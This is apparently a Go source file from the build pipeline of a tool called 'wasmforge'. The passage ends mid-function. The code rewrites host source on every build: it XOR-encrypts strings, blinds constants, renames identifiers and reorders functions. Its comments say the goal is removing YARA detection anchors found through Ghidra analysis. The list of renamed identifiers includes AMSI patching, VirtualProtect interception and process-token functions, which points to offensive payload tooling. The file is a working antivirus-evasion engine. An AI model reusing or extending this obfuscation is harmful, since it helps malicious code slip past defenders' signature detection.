package build

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"go/ast"
	"go/parser"
	"go/printer"
	"go/token"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
)

// hostTransformConfig holds per-build randomization state for host code transforms.
type hostTransformConfig struct {
	wl       *wordList
	used     map[string]bool // tracks generated names to prevent collisions
	strKey   [32]byte        // per-build XOR key for string encryption
	verbose  bool
	ghost    *GhostProfile   // optional ghost profile for authentic name generation

	// Generated names (populated during transform).
	decryptFuncName string // name of the string decrypt function
	strTableName    string // name of the encrypted string table variable
	strKeyName      string // name of the key variable
	strDecodedName  string // name of the decoded string slice

	// Stashed by Phase 7 for post-generation application to main.go.
	identReplacements [][2]string
}

// ghostOrGenerate returns a ghost function name when a ghost profile is loaded,
// otherwise falls back to a wordList-generated name.
func (tc *hostTransformConfig) ghostOrGenerate() string {
	if tc.ghost != nil {
		return tc.ghost.FunctionName(tc.used)
	}
	return tc.wl.generate(tc.used)
}

// ghostOrGenerateExported returns a ghost exported name when a ghost profile is
// loaded, otherwise falls back to a wordList-generated exported name.
func (tc *hostTransformConfig) ghostOrGenerateExported() string {
	if tc.ghost != nil {
		return tc.ghost.ExportedName(tc.used)
	}
	return tc.wl.generateExported(tc.used)
}

// transformHostCode applies all polymorphic transforms to the copied host
// source files. Called after copyAndAnonymize() and before go build.
//
// Transforms (in execution order):
//
//	Phase 8:  Registration chain splitting — break long builder chains
//	Phase 9:  Struct field reordering — shuffle struct field order (NEW)
//	Phase 7:  Identifier deepening — randomize internal type/func names
//	Phase 10: Opaque predicates — inject always-true conditional branches (NEW)
//	Phase 11: Source-level AST transforms — branch flip, temp extract, loop invert (NEW)
//	Phase 1:  String encryption — encrypt all string literals with per-build key
//	Phase 2:  Constant blinding — replace constants with XOR pairs
//	Phase 5:  Function reordering — shuffle top-level declarations
//	Phase 6:  Dead code injection — add unreachable functions
func transformHostCode(hostDir string, pc *polyConfig, verbose bool) (*hostTransformConfig, error) {
	tc := &hostTransformConfig{
		wl:      newWordList(),
		used:    make(map[string]bool),
		verbose: verbose,
		ghost:   pc.Ghost,
	}

	// Generate per-build encryption key.
	if _, err := rand.Read(tc.strKey[:]); err != nil {
		return nil, fmt.Errorf("generating string key: %w", err)
	}

	// Pre-generate names for the string encryption infrastructure.
	tc.decryptFuncName = tc.ghostOrGenerate()
	tc.strTableName = tc.ghostOrGenerate()
	tc.strKeyName = tc.ghostOrGenerate()
	tc.strDecodedName = tc.ghostOrGenerate()

	if verbose {
		fmt.Fprintf(os.Stderr, "wasmforge: host transforms — str_func=%s\n", tc.decryptFuncName)
	}

	// Find all Go source directories to transform.
	// These are the copied hostmod, runtime, and names packages.
	var pkgDirs []string
	err := filepath.Walk(hostDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() && path != hostDir {
			// Check if this dir has .go files (is a Go package).
			entries, _ := filepath.Glob(filepath.Join(path, "*.go"))
			if len(entries) > 0 {
				// Skip the wazero fork and vendor dirs — transform separately.
				rel, _ := filepath.Rel(hostDir, path)
				if !strings.HasPrefix(rel, "wazero") && rel != "." {
					pkgDirs = append(pkgDirs, path)
				}
			}
		}
		return nil
	})
	if err != nil {
		return nil, fmt.Errorf("walking host dir: %w", err)
	}

	// Phase 8: Registration chain splitting (must run BEFORE identifier deepening
	// so that function names are still recognizable for pattern matching).
	//
	// WASMFORGE_NO_CHAIN_SPLIT escapes this transform — set automatically for
	// NativeAOT builds by embedder.go because the splitter currently miscounts
	// block boundaries when the registration chain in nativeaot.go exceeds
	// ~45 entries (regression observed after the kerberos/LDAP/DC entries
	// were appended in fdffb89). The missed boundary drops the kerberos
	// block from the emitted host code, breaking sharpup.exe at runtime with
	// "crypto_kerbhash is not exported in module env".
	if os.Getenv("WASMFORGE_NO_CHAIN_SPLIT") == "" {
		for _, dir := range pkgDirs {
			if err := tc.splitRegistrationChainsInDir(dir); err != nil {
				return nil, fmt.Errorf("splitting registrations in %s: %w", dir, err)
			}
		}
	}

	// Phase 9: Struct field reordering (must run BEFORE identifier deepening
	// so that struct field names are still original for skip-list detection).
	if os.Getenv("WASMFORGE_NO_STRUCT_REORDER") == "" {
		for _, dir := range pkgDirs {
			if err := tc.reorderStructFieldsInDir(dir); err != nil {
				return nil, fmt.Errorf("reordering struct fields in %s: %w", dir, err)
			}
		}
	}

	// Phase 7: Identifier deepening (must run BEFORE string encryption
	// since it does text replacement on identifier names).
	// Seed the collision avoidance set with every declared identifier
	// across all package directories before generating new names.
	tc.scanExistingIdentifiers(pkgDirs)
	// Generate the replacement map ONCE so all packages use the same
	// random names — cross-package references (e.g., runtime calling
	// hostmod.WithConfig) must resolve to the same renamed identifier.
	identReplacements := tc.buildIdentReplacements()
	for _, dir := range pkgDirs {
		if err := tc.applyIdentReplacements(dir, identReplacements); err != nil {
			return nil, fmt.Errorf("deepening identifiers in %s: %w", dir, err)
		}
	}
	// Stash replacements so embedder can apply them to main.go after generation.
	tc.identReplacements = identReplacements

	// Phase 10: Opaque predicates (inserts always-true branches to vary CFG).
	if os.Getenv("WASMFORGE_NO_OPAQUE") == "" {
		for _, dir := range pkgDirs {
			if err := tc.insertOpaquePredicatesInDir(dir); err != nil {
				return nil, fmt.Errorf("inserting opaque predicates in %s: %w", dir, err)
			}
		}
	}

	// Phase 11: Source-level AST transforms (branch flipping, temp extraction,
	// loop inversion to vary compiled code patterns).
	if os.Getenv("WASMFORGE_NO_CODEXFORM") == "" {
		for _, dir := range pkgDirs {
			if err := tc.transformCodePatternsInDir(dir); err != nil {
				return nil, fmt.Errorf("transforming code patterns in %s: %w", dir, err)
			}
		}
	}

	// Phase 1: String encryption.
	for _, dir := range pkgDirs {
		if err := tc.encryptStringsInDir(dir); err != nil {
			return nil, fmt.Errorf("encrypting strings in %s: %w", dir, err)
		}
	}

	// Phase 2: Constant blinding.
	for _, dir := range pkgDirs {
		if err := tc.blindConstantsInDir(dir); err != nil {
			return nil, fmt.Errorf("blinding constants in %s: %w", dir, err)
		}
	}

	// Phase 5: Function reordering (disable with WASMFORGE_NO_REORDER=1).
	if os.Getenv("WASMFORGE_NO_REORDER") == "" {
		for _, dir := range pkgDirs {
			if err := tc.reorderFunctionsInDir(dir); err != nil {
				return nil, fmt.Errorf("reordering functions in %s: %w", dir, err)
			}
		}
	}

	// Phase 6: Dead code injection (disable with WASMFORGE_NO_DEADCODE=1).
	if os.Getenv("WASMFORGE_NO_DEADCODE") != "" {
		return tc, nil // skip dead code
	}
	for _, dir := range pkgDirs {
		if err := tc.injectDeadCodeInDir(dir); err != nil {
			return nil, fmt.Errorf("injecting dead code in %s: %w", dir, err)
		}
	}

	return tc, nil
}

// ---------------------------------------------------------------------------
// Phase 1: String Encryption
// ---------------------------------------------------------------------------

// stringLiteralRe matches Go string literals (double-quoted).
// Handles escaped quotes inside strings.
var stringLiteralRe = regexp.MustCompile(`"(?:[^"\\]|\\.)*"`)

// Strings that must NOT be encrypted (would break Go compilation or runtime).
var stringEncryptSkip = map[string]bool{
	`""`:       true, // empty string
	`"\n"`:     true, // single newline
	`"\t"`:     true, // single tab
	`"\r"`:     true, // single CR
	`"\r\n"`:   true,
	`" "`:      true, // single space
	`","`:      true,
	`"."`:      true,
	`":"`:      true,
	`"/"`:      true,
	`"\\"`:     true,
	`"="`:      true,
	`"0"`:      true,
	`"1"`:      true,
}

// Lines containing these patterns have string literals that must not be encrypted.
var lineSkipPatterns = []string{
	"//go:wasmimport",
	"//go:embed",
	"//go:linkname",
	"//go:build",
	"// +build",
	"//go:nosplit",
	"//go:noinline",
	"//go:noescape",
	"//go:generate",
	"import (",
	"import \"",
	"package ",
}

// lineIsImport detects all forms of Go import lines (single, aliased, dot).
func lineIsImport(trimmed string) bool {
	if strings.HasPrefix(trimmed, "import ") || strings.HasPrefix(trimmed, "import\t") {
		return true
	}
	return false
}

// encryptStringsInDir encrypts string literals in all .go files in a directory.
// Each string literal is replaced with an inline decrypt call carrying its own
// encrypted data, avoiding cross-file index alignment issues with build tags.
// Generates a companion file (random name) with the decrypt function and key.
func (tc *hostTransformConfig) encryptStringsInDir(dir string) error {
	files, _ := filepath.Glob(filepath.Join(dir, "*.go"))
	if len(files) == 0 {
		return nil
	}

	// Determine package name from first file.
	pkgName := ""
	for _, f := range files {
		data, err := os.ReadFile(f)
		if err != nil {
			continue
		}
		if m := regexp.MustCompile(`^package\s+(\w+)`).FindSubmatch(data); m != nil {
			pkgName = string(m[1])
			break
		}
	}
	if pkgName == "" {
		return nil
	}

	anyModified := false

	// Process each file independently — no shared string table.
	for _, f := range files {
		base := filepath.Base(f)
		// Skip generated files we create.
		if strings.HasPrefix(base, "zz_") {
			continue
		}

		data, err := os.ReadFile(f)
		if err != nil {
			continue
		}
		content := string(data)
		modified := false

		// Process line by line.
		lines := strings.Split(content, "\n")
		inImportBlock := false
		inConstBlock := false

		for i, line := range lines {
			trimmed := strings.TrimSpace(line)

			// Track import blocks.
			if strings.HasPrefix(trimmed, "import (") {
				inImportBlock = true
				continue
			}
			if inImportBlock && trimmed == ")" {
				inImportBlock = false
				continue
			}
			if inImportBlock {
				continue
			}

			// Track const blocks — string values inside const must remain constant expressions.
			if strings.HasPrefix(trimmed, "const (") || (strings.HasPrefix(trimmed, "const ") && strings.Contains(trimmed, "=") && strings.Contains(trimmed, `"`)) {
				if strings.HasPrefix(trimmed, "const (") {
					inConstBlock = true
				}
				continue // skip const declaration line and const block opener
			}
			if inConstBlock && trimmed == ")" {
				inConstBlock = false
				continue
			}
			if inConstBlock {
				continue // skip all const block entries
			}

			// Skip standalone const lines with string values.
			if strings.HasPrefix(trimmed, "const ") && strings.Contains(line, `"`) {
				continue
			}

			// Skip lines containing struct tags (backtick-delimited).
			// String literals inside struct tags can't be replaced with
			// function calls — they must remain compile-time constants.
			if strings.Contains(line, "`") {
				continue
			}

			// Skip directive lines and import lines (all forms).
			skip := false
			for _, pat := range lineSkipPatterns {
				if strings.Contains(trimmed, pat) {
					skip = true
					break
				}
			}
			if skip || lineIsImport(trimmed) {
				continue
			}

			// Skip comment-only lines.
			if strings.HasPrefix(trimmed, "//") {
				continue
			}

			// Find and replace string literals on this line.
			newLine := stringLiteralRe.ReplaceAllStringFunc(line, func(lit string) string {
				if stringEncryptSkip[lit] {
					return lit
				}
				inner := lit[1 : len(lit)-1]
				if len(inner) <= 2 || isFormatVerb(inner) {
					return lit
				}

				// Check if this literal is inside a comment on this line.
				commentIdx := strings.Index(line, "//")
				litIdx := strings.Index(line, lit)
				if commentIdx >= 0 && litIdx > commentIdx {
					return lit // inside comment
				}

				plain, err := unquoteGoString(inner)
				if err != nil {
					return lit
				}

				// Encrypt and produce inline decrypt call.
				encrypted := xorEncrypt([]byte(plain), tc.strKey[:])
				return fmt.Sprintf("%s(%q)", tc.decryptFuncName, string(encrypted))
			})

			if newLine != line {
				lines[i] = newLine
				modified = true
			}
		}

		if modified {
			anyModified = true
			if err := os.WriteFile(f, []byte(strings.Join(lines, "\n")), 0o644); err != nil {
				return fmt.Errorf("writing %s: %w", f, err)
			}
		}
	}

	// Only generate the decrypt helper if we actually encrypted something.
	if anyModified {
		if err := tc.writeDecryptHelper(dir, pkgName); err != nil {
			return err
		}
	}

	return nil
}

// writeDecryptHelper generates a helper file (random name) with the per-build key and
// decrypt function. Each call site passes its own encrypted data inline,
// so there's no shared table or index alignment concern.
func (tc *hostTransformConfig) writeDecryptHelper(dir, pkgName string) error {
	var b strings.Builder

	b.WriteString(fmt.Sprintf("package %s\n\n", pkgName))
	b.WriteString("import \"sync\"\n\n")

	// Per-build XOR key.
	b.WriteString(fmt.Sprintf("var %s = [32]byte{", tc.strKeyName))
	for i, k := range tc.strKey {
		if i > 0 {
			b.WriteByte(',')
		}
		b.WriteString(fmt.Sprintf("0x%02x", k))
	}
	b.WriteString("}\n\n")

	// Decrypt function: takes encrypted string, returns plaintext.
	// Uses a sync.Map cache for thread safety — comWorkerInit starts a
	// goroutine that decrypts strings concurrently with the main goroutine,
	// causing "concurrent map read and map write" panics with plain maps.
	cacheName := tc.ghostOrGenerate()
	b.WriteString(fmt.Sprintf("var %s sync.Map\n\n", cacheName))
	b.WriteString(fmt.Sprintf("func %s(enc string) string {\n", tc.decryptFuncName))
	b.WriteString(fmt.Sprintf("\tif v, ok := %s.Load(enc); ok { return v.(string) }\n", cacheName))
	b.WriteString("\tb := []byte(enc)\n")
	b.WriteString(fmt.Sprintf("\tfor i := range b { b[i] ^= %s[i%%32] }\n", tc.strKeyName))
	b.WriteString("\ts := string(b)\n")
	b.WriteString(fmt.Sprintf("\t%s.Store(enc, s)\n", cacheName))
	b.WriteString("\treturn s\n")
	b.WriteString("}\n")

	// Ensure the filename doesn't start with "_" or "." — Go ignores such files.
	fname := tc.ghostOrGenerate()
	for strings.HasPrefix(fname, "_") || strings.HasPrefix(fname, ".") {
		fname = "z" + fname[1:]
	}
	path := filepath.Join(dir, fname+".go")
	return os.WriteFile(path, []byte(b.String()), 0o644)
}

// xorEncrypt XORs data with a repeating key.
func xorEncrypt(data, key []byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out
}

// unquoteGoString decodes Go string escape sequences.
func unquoteGoString(s string) (string, error) {
	// Use fmt.Sscanf to handle Go escape sequences.
	var result []byte
	i := 0
	for i < len(s) {
		if s[i] == '\\' && i+1 < len(s) {
			switch s[i+1] {
			case 'n':
				result = append(result, '\n')
				i += 2
			case 'r':
				result = append(result, '\r')
				i += 2
			case 't':
				result = append(result, '\t')
				i += 2
			case '\\':
				result = append(result, '\\')
				i += 2
			case '"':
				result = append(result, '"')
				i += 2
			case '\'':
				result = append(result, '\'')
				i += 2
			case 'x':
				if i+3 < len(s) {
					b, err := hex.DecodeString(s[i+2 : i+4])
					if err == nil {
						result = append(result, b[0])
						i += 4
						continue
					}
				}
				result = append(result, s[i])
				i++
			case '0':
				result = append(result, 0)
				i += 2
			default:
				result = append(result, s[i])
				i++
			}
		} else {
			result = append(result, s[i])
			i++
		}
	}
	return string(result), nil
}

// isFormatVerb returns true for strings that are just format specifiers.
func isFormatVerb(s string) bool {
	s = strings.TrimSpace(s)
	if len(s) <= 3 && strings.HasPrefix(s, "%") {
		return true
	}
	return false
}

// ---------------------------------------------------------------------------
// Phase 2: Constant Blinding
// ---------------------------------------------------------------------------

// blindableConsts maps constant names to their values for XOR blinding.
// Only constants with distinctive values that could serve as YARA anchors.
// The bool indicates whether the constant is used as int32 (true) or int (false).
type blindableConstInfo struct {
	value   int64
	isInt32 bool
}

// NOTE: baseFD, basePipeFD, win32BaseHandle are excluded because they are
// used in type-sensitive comparisons (uint32/uint64 >= const). Changing
// from untyped const to typed var breaks implicit conversion. These values
// (10000, 15000, 20000) are not distinctive enough for YARA on their own.
var blindableConsts = map[string]blindableConstInfo{
	"errnoYIELD":     {255, false},
	"maxMirrorDepth": {8, false},
}

// constDeclRe matches `const NAME = VALUE` or `const NAME TYPE = VALUE`.
var constDeclRe = regexp.MustCompile(`(?m)^(\s*)const\s+(\w+)\s+(?:\w+\s+)?=\s+(\d+)\s*$`)

// constBlockEntryRe matches entries inside const ( ... ) blocks.
var constBlockEntryRe = regexp.MustCompile(`(?m)^(\s+)(\w+)\s*=\s*(\d+)\s*$`)

func (tc *hostTransformConfig) blindConstantsInDir(dir string) error {
	files, _ := filepath.Glob(filepath.Join(dir, "*.go"))
	for _, f := range files {
		data, err := os.ReadFile(f)
		if err != nil {
			continue
		}
		content := string(data)
		modified := false

		// Replace standalone const declarations.
		content = constDeclRe.ReplaceAllStringFunc(content, func(match string) string {
			m := constDeclRe.FindStringSubmatch(match)
			if m == nil {
				return match
			}
			indent := m[1]
			name := m[2]
			info, ok := blindableConsts[name]
			if !ok {
				return match
			}
			var val int64
			fmt.Sscanf(m[3], "%d", &val)
			a := int64(cryptoRandN(0x7FFFFFFF))
			b := a ^ val
			modified = true
			castType := "int"
			if info.isInt32 {
				castType = "int32"
			}
			return fmt.Sprintf("%svar %s = %s(%d ^ %d)", indent, name, castType, a, b)
		})

		// Replace const block entries.
		content = constBlockEntryRe.ReplaceAllStringFunc(content, func(match string) string {
			m := constBlockEntryRe.FindStringSubmatch(match)
			if m == nil {
				return match
			}
			name := m[2]
			info, ok := blindableConsts[name]
			if !ok {
				return match
			}
			var val int64
			fmt.Sscanf(m[3], "%d", &val)
			a := int64(cryptoRandN(0x7FFFFFFF))
			b := a ^ val
			modified = true
			castType := "int"
			if info.isInt32 {
				castType = "int32"
			}
			return fmt.Sprintf("%s%s = %s(%d ^ %d)", m[1], name, castType, a, b)
		})

		if modified {
			if err := os.WriteFile(f, []byte(content), 0o644); err != nil {
				return fmt.Errorf("writing %s: %w", f, err)
			}
		}
	}
	return nil
}

// ---------------------------------------------------------------------------
// Phase 7: Identifier Deepening
// ---------------------------------------------------------------------------

// distinctiveIdents are internal identifiers that appear in gopclntab and
// could serve as YARA anchors. Each is replaced with a random name.
// Ordered longest-first to prevent partial matches.
//
// Round 1 (46 entries): types, map variables, and function names identified
// from initial Ghidra analysis of batch4 builds.
//
// Round 2 (+191 entries): all surviving bare hostmod function names found
// constant across 10 post-hardening builds via gopclntab extraction. Covers
// win32 proxies (41), socket functions (24+1), OS proxies (12), lazy procs (11),
// memory I/O helpers (10), mirror table (8), lifecycle/constructors (27),
// COM infrastructure (6), known addr tracking (5), shadow memory (4),
// pipe infrastructure (5), raw sockets (3), and other distinctive names (35).
var distinctiveIdents = []string{
	// --- Round 1: Types, map variables, core function names ---
	"comVectoredExceptionHandler",
	"fixNtQuerySystemInfoPointers",
	"initExtCallbacks.deferwrap1",
	"interceptShadowMemoryCall",
	"compactSinglePointerStruct",
	"registerDarwinFunctions",
	"comSyscallNWithMsgPump",
	"initKnownProcAddrs.func1",
	"registerWin32Functions",
	"compactSidAndAttributes",
	"initExtCallbacks.func10",
	"interceptVirtualProtect",
	"isErrConnectInProgress",
	"knownAddrVirtualProtect",
	"win32QueryServiceStatus",
	"execShadowEntryPoint",
	"generatedPointerMasks",
	"initExtCallbacks.func1",
	"initExtCallbacks.func2",
	"initExtCallbacks.func3",
	"initExtCallbacks.func4",
	"initExtCallbacks.func5",
	"initExtCallbacks.func6",
	"initExtCallbacks.func7",
	"initExtCallbacks.func8",
	"initExtCallbacks.func9",
	"initShadowArena.func1",
	"interceptVirtualAlloc",
	"knownAddrVirtualAlloc",
	"pendingAsyncState",
	"translateSockoptLevel",
	"win32OpenProcessToken",
	"win32TerminateProcess",
	"classifyWinsockError",
	"interceptVirtualFree",
	"knownAddrVirtualFree",
	"nonBlockingPipeRead",
	"osStartProcess.func1",
	"readNativeWideString",
	"semanticOverrides",
	"shadowVirtualProtect",
	"translateSockoptName",
	"win32GetComputerName",
	"denormalizeWasiPath",
	"mirrorShouldMirror",
	"newWin32HandleTable",
	"ntAPINoMirrorArgs",
	"procRegDeleteValueW",
	"waitConnectComplete",
	"win32ExtResetOutput",
	"win32GetProcAddress",
	"win32RegDeleteValue",
	"win32VirtualProtect",
	// --- Round 2: Surviving bare hostmod function names ---
	"comWorkerRequest",
	"comWorkerResult",
	"deserializeStrings",
	"generatedPtrMasks",
	"initKnownProcAddrs",
	"knownStructLayouts",
	"mirrorIsCodeRegion",
	"mirrorRegionSize",
	"procGetProcAddress",
	"procRegSetValueExW",
	"procVirtualProtect",
	"shadowVirtualAlloc",
	"win32CreateProcess",
	"win32ExtReadOutput",
	"win32HandleTable",
	"win32HandleEntry",
	"win32OpenSCManager",
	"win32RegQueryValue",
	"compactTokenInfo",
	"errnoFromError",
	"mirrorDataIsUTF16",
	"nativeSprintf",
	"procPeekNamedPipe",
	"resolveExecPath",
	"setSocketNonblock",
	"shadowVirtualFree",
	"sockaddrToNetAddr",
	"win32GetFileAttrs",
	"win32GetTokenInfo",
	"win32ProcFromHMem",
	"win32SetFileAttrs",
	"win32VirtualAlloc",
	"writeReturnValues",
	"WithWin32Handles",
	"fixPointerToWasm",
	"getPointerMask",
	"initExtCallbacks",
	"mirrorDebugLog",
	"processEntry",
	"processTable",
	"procLoadLibraryA",
	"readNativeString",
	"win32CloseHandle",
	"win32FreeLibrary",
	"win32HMemWrite32",
	"win32HMemWrite64",
	"win32LoadLibrary",
	"win32NewCallback",
	"win32OpenProcess",
	"win32RegCloseKey",
	"win32RegSetValue",
	"win32SyscallN",
	"win32VirtualFree",
	"blockingAPIs",
	"bytesToSockaddr",
	"callbackNameMap",
	"comWorkerInit",
	"containsKeyword",
	"getWin32Handles",
	"initShadowArena",
	"isErrWouldBlock",
	"loadComProcs",
	"mirrorDebugFile",
	"mirrorDebugOnce",
	"mirrorWriteHost",
	"ntapiOverrides",
	"procIoctlsocket",
	"procRecvfromRaw",
	"sockGetaddrinfo",
	"sockGetpeername",
	"sockGetsockname",
	"sockaddrToBytes",
	"translateDomain",
	"win32CreateFile",
	"win32ExtGetFunc",
	"win32HMemRead32",
	"win32HMemRead64",
	"win32RegEnumKey",
	"win32RegOpenKey",
	"comSyscallN",
	"globalExtState",
	"knownAddrsOnce",
	"maxMirrorDepth",
	"mirrorDiagMode",
	"mirrorReadHost",
	"mirrorEntry",
	"osStartProcess",
	"socketEntry",
	"sockConnect",
	"sockGetsockopt",
	"sockSetsockopt",
	"socketRecvFrom",
	"win32Available",
	"win32HMemWrite",
	"win32WriteFile",
	"WithPipeTable",
	"WithShadowMap",
	"arenaHostAddr",
	"listProcesses",
	"netInterfaces",
	"osProcessList",
	"osUserCurrent",
	"peekNamedPipe",
	"pendingMirror",
	"shadowEntry",
	"sockaddrToRaw",
	"win32HMemAddr",
	"win32HMemRead",
	"win32ProcAddr",
	"win32ReadFile",
	"yieldOnEAGAIN",
	"mirrorTable",
	"NewPipeTable",
	"getPipeTable",
	"getShadowMap",
	"newPipeTable",
	"newShadowMap",
	"pendingAsync",
	"sockRecvfrom",
	"sockShutdown",
	"socketAccept",
	"socketSendTo",
	"winsockErrno",
	"WithFDTable",
	"comInitOnce",
	"modadvapi32",
	"modkernel32",
	"modws2_32",
	"rawSockOpen",
	"rawSockRecv",
	"rawSockSend",
	"shadowArena",
	"shadowMap",
	"socketClose",
	"structField",
	"unsafeSlice",
	"writeUint32",
	"NewFDTable",
	"PatchAMSI",
	"WithConfig",
	"comWorker",
	"getFDTable",
	"indexFrom",
	"mirrorDiag",
	"newFDTable",
	"osHostname",
	"pipeEntry",
	"pipeTable",
	"procAccept",
	"procSelect",
	"procSendto",
	"readUint32",
	"sockAccept",
	"sockListen",
	"sockSendto",
	"socketRecv",
	"socketSend",
	"win32Call",
	"win32Errno",
	"writeBytes",
	"writeInt32",
	"comProcs",
	"debugNet",
	"fdTable",
	"isLetter",
	"isPipeFD",
	"osGetpid",
	"pipeClose",
	"pipeRead",
	"pipeWrite",
	"readBytes",
	"sockBind",
	"sockClose",
	"sockOpen",
	"sockRead",
	"sockWrite",
	"initCOM",
	"osChdir",
	"osExec",
	"osGetwd",
	"osWait4",
	"putLE64",
	"safeArg",
	"osPipe",
}

// protectedIdents are Go interface method names and common identifiers
// that must never be renamed — renaming breaks interface satisfaction.
var protectedIdents = map[string]bool{
	"Error": true, "String": true, "GoString": true,
	"Unwrap": true, "Is": true, "As": true,
	"Read": true, "Write": true, "Close": true,
	"Len": true, "Less": true, "Swap": true,
	"Format": true, "MarshalJSON": true, "UnmarshalJSON": true,
	"MarshalText": true, "UnmarshalText": true,
	"MarshalBinary": true, "UnmarshalBinary": true,
}

// buildIdentReplacements generates the replacement map once. Must be called
// once per build and the result shared across all package directories so that
// cross-package references (e.g., runtime → hostmod.WithConfig) resolve to
// the same random name on both sides.
func (tc *hostTransformConfig) buildIdentReplacements() [][2]string {
	replacements := make([][2]string, 0, len(distinctiveIdents))
	for _, ident := range distinctiveIdents {
		// Skip entries with dots — these are gopclntab closure names
		// (e.g., "initExtCallbacks.func1") that don't appear in source.
		// The parent name (e.g., "initExtCallbacks") is renamed separately,
		// and Go automatically names the closures "<parent>.funcN".
		if strings.Contains(ident, ".") {
			continue
		}
		// Skip protected interface method names — renaming these breaks
		// interface satisfaction (e.g., Error, Read, Write, Close).
		if protectedIdents[ident] {
			continue
		}
		var newName string
		if ident[0] >= 'A' && ident[0] <= 'Z' {
			newName = tc.ghostOrGenerateExported()
		} else {
			newName = tc.ghostOrGenerate()
		}
		replacements = append(replacements, [2]string{ident, newName})
	}
	return replacements
}

// scanExistingIdentifiers parses all .go files in the given directories
// and collects every declared identifier name. This seeds the collision
// avoidance set so generated names don't collide with existing code.
func (tc *hostTransformConfig) scanExistingIdentifiers(dirs []string) {
	fset := token.NewFileSet()
	for _, dir := range dirs {
		files, _ := filepath.Glob(filepath.Join(dir, "*.go"))
		for _, f := range files {
			parsed, err := parser.ParseFile(fset, f, nil, parser.SkipObjectResolution)
			if err != nil {
				continue
			}
			for _, decl := range parsed.Decls {
				switch d := decl.(type) {
				case *ast.GenDecl:
					for _, spec := range d.Specs {
						switch s := spec.(type) {
						case *ast.TypeSpec:
							tc.used[s.Name.Name] = true
						case *ast.ValueSpec:
							for _, name := range s.Names {
								tc.used[name.Name] = true
							}
						}
					}
				case *ast.FuncDecl:
					tc.used[d.Name.Name] = true
				}
			}
		}
	}
}

// identBoundaryRe builds a regex that matches ident only at word boundaries.
// Go identifiers are [a-zA-Z0-9_], so we ensure the match isn't inside a
// longer identifier (e.g., "WithConfig" must not match inside "NewRuntimeWithConfig").
func identBoundaryRe(ident string) *regexp.Regexp {
	// Escape any regex-special characters in the identifier.
	escaped := regexp.QuoteMeta(ident)
	// Use \b (word boundary) which matches between \w and \W characters.
	// This prevents matching substrings inside longer identifiers.
	return regexp.MustCompile(`\b` + escaped + `\b`)
}

// applyIdentReplacements applies identifier renames using Go AST parsing
// to ensure only actual identifiers are renamed (not strings, comments,
// or import paths). Falls back to regex for files that fail to parse.
func (tc *hostTransformConfig) applyIdentReplacements(dir string, replacements [][2]string) error {
	renameMap := make(map[string]string, len(replacements))
	for _, pair := range replacements {
		renameMap[pair[0]] = pair[1]
	}

	files, _ := filepath.Glob(filepath.Join(dir, "*.go"))
	for _, f := range files {
		data, err := os.ReadFile(f)
		if err != nil {
			continue
		}
		content := string(data)

		// Try AST-based renaming first.
		fset := token.NewFileSet()
		parsed, parseErr := parser.ParseFile(fset, f, data, parser.ParseComments|parser.SkipObjectResolution)
		if parseErr != nil {
			// Fall back to regex for unparseable files.
			modified := false
			for _, pair := range replacements {
				re := identBoundaryRe(pair[0])
				if re.MatchString(content) {
					content = re.ReplaceAllString(content, pair[1])
					modified = true
				}
			}
			if modified {
				os.WriteFile(f, []byte(content), 0o644)
			}
			continue
		}

		// Collect all identifier positions that need renaming.
		// We work with byte offsets and replace in reverse order to preserve positions.
		type replacement struct {
			start, end int
			newName    string
		}
		var reps []replacement

		ast.Inspect(parsed, func(n ast.Node) bool {
			ident, ok := n.(*ast.Ident)
			if !ok {
				return true
			}
			newName, found := renameMap[ident.Name]
			if !found {
				return true
			}
			start := fset.Position(ident.Pos()).Offset
			end := start + len(ident.Name)
			reps = append(reps, replacement{start, end, newName})
			return true
		})

		if len(reps) == 0 {
			continue
		}

		// Sort by offset descending so replacements don't shift positions.
		sort.Slice(reps, func(i, j int) bool {
			return reps[i].start > reps[j].start
		})

		// Apply replacements.
		buf := []byte(content)
		for _, r := range reps {
			if r.start >= 0 && r.end <= len(buf) {
				buf = append(buf[:r.start], append([]byte(r.newName), buf[r.end:]...)...)
			}
		}

		if err := os.WriteFile(f, buf, 0o644); err != nil {
			return fmt.Errorf("writing %s: %w", f, err)
		}
	}
	return nil
}

// ---------------------------------------------------------------------------
// Phase 5: Function Reordering
// ---------------------------------------------------------------------------

// topLevelDeclRe identifies the start of a top-level declaration.
// Must start at column 0 (no leading whitespace) to avoid matching
// local declarations inside function bodies.
var topLevelDeclRe = regexp.MustCompile(`^(?:func |type |var |const )`)

func (tc *hostTransformConfig) reorderFunctionsInDir(dir string) error {
	files, _ := filepath.Glob(filepath.Join(dir, "*.go"))
	for _, f := range files {
		if err := tc.reorderFunctionsInFile(f); err != nil {
			return err
		}
	}
	return nil
}

// block represents a top-level declaration block for reordering.
type block struct {
	lines  []string
	isInit bool // init() functions keep relative order
}

func (tc *hostTransformConfig) reorderFunctionsInFile(path string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	// Skip generated files and assembly companion files.
	base := filepath.Base(path)
	if strings.HasPrefix(base, "zz_") || strings.HasPrefix(base, "generated_") {
		return nil
	}

	content := string(data)
	lines := strings.Split(content, "\n")

	var header []string
	var blocks []block
	var currentBlock []string
	var pendingComments []string // comment/directive lines before a declaration
	inHeader := true
	inImport := false

	flushBlock := func() {
		if len(currentBlock) == 0 {
			return
		}
		isInit := false
		for _, bl := range currentBlock {
			if strings.HasPrefix(strings.TrimSpace(bl), "func init()") {
				isInit = true
			}
		}
		blocks = append(blocks, block{lines: currentBlock, isInit: isInit})
		currentBlock = nil
	}

	isTopLevelDecl := func(line string) bool {
		return topLevelDeclRe.MatchString(line) &&
			!strings.HasPrefix(line, "\t") &&
			!strings.HasPrefix(line, " ")
	}

	for _, line := range lines {
		trimmed := strings.TrimSpace(line)

		if inHeader {
			if strings.HasPrefix(trimmed, "import (") {
				inImport = true
				header = append(header, line)
				continue
			}
			if inImport {
				header = append(header, line)
				if trimmed == ")" {
					inImport = false
				}
				continue
			}
			if lineIsImport(trimmed) {
				header = append(header, line)
				continue
			}
			if isTopLevelDecl(line) {
				inHeader = false
				// Pending comments collected during header phase belong to this decl.
				currentBlock = append(currentBlock, pendingComments...)
				pendingComments = nil
				currentBlock = append(currentBlock, line)
				continue
			}
			// Collect potential comment lines before first declaration.
